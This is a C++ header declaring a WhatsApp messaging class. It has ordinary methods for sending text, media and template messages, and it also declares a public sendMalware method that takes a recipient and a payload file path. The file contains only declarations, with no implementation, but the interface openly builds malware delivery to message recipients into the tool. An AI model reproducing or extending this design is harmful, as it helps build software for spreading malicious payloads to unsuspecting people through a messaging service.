#ifndef WHATSAPPSENDER_H
#define WHATSAPPSENDER_H

#include <string>
#include <vector>
#include <unordered_map>
#include <memory>
#include "TemplateLoader.h"
#include "Logger.h"
#include "MCreator.h"
#include "URLShortener.h"

class WhatsAppSender {
public:
    WhatsAppSender(const std::string &authToken);
    
    bool sendMessage(const std::string &recipient, const std::string &message);
    bool sendMediaMessage(const std::string &recipient, const std::string &mediaUrl, const std::string &caption);
    bool sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params);
    void setTemplateLoader(const std::shared_ptr<TemplateLoader>& loader);
    
    void sendMalware(const std::string &recipient, const std::string &payloadPath);

private:
    std::string authToken;
    std::string apiUrl;
    std::shared_ptr<TemplateLoader> templateLoader;

    std::string buildMessagePayload(const std::string &recipient, const std::string &message);
    std::string buildMediaMessagePayload(const std::string &recipient, const std::string &mediaUrl, const std::string &caption);
    std::string buildTemplateMessagePayload(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params);
    bool sendRequest(const std::string &payload);

    void logError(const std::string &error);
    void logInfo(const std::string &info);
    void handleApiResponse(const std::string &response);
    bool retryOnFailure(const std::string &payload, int retries = 3);
};

#endif // WHATSAPPSENDER_H




